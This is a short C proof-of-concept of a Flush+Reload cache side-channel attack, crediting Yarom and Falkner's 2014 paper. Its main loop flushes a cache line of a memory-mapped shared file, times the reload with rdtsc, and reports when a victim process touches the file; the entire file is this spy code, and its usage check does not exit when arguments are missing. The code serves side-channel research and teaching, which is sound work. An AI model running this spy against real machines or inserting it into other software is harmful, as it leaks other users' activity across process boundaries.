/*
 * PoC FOR CACHE SIDE CHANNEL ATTACK USING FLUSH+RELOAD TECHNIQUE
 * 
 * ///Author: Tasmin Hasan Fuwad
 * Date: October, 2026
 * 
 * Spy monitors access patterns to a shared file-backed
 * mmap'd page by measuring reload times after cache line eviction
 * 
 * Based on concepts from:
 * ///Yarom & Falkner, "FLUSH+RELOAD : A High Resolution, Low Noise
 * L3 Cache Side-Channel Attack" (USENIX Security 2014)
 * 
 * ///github.com/taehunk/simpleFR
 * ///github.com/koreauniv-lsm/CSCA
*/

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include "cacheutility.h"

int main(int argc, char *argv[])
{
    size_t start, end, threshold;
    if(argc < 2) {
        fprintf(stderr, "Usage: %s [*.txt]\n", argv[0]);
    }

    int fd = open(argv[1], O_RDONLY);
    if(fd < 0) return 1;

    unsigned char *addr = (unsigned char*)mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, 0);
    if(addr == (void*) -1) return 0;

    threshold = flush_reload_threshold_detection();
    printf("LLC miss threshold: %ld\n", threshold);

    for(;;) {
        _mm_clflush(addr);
        _mm_mfence();

        start = rdtsc();
        maccess(addr);
        end = rdtsc();

        if((end - start) < threshold) printf("Victim has accessed target file.. \n");
    }
    return 0;
}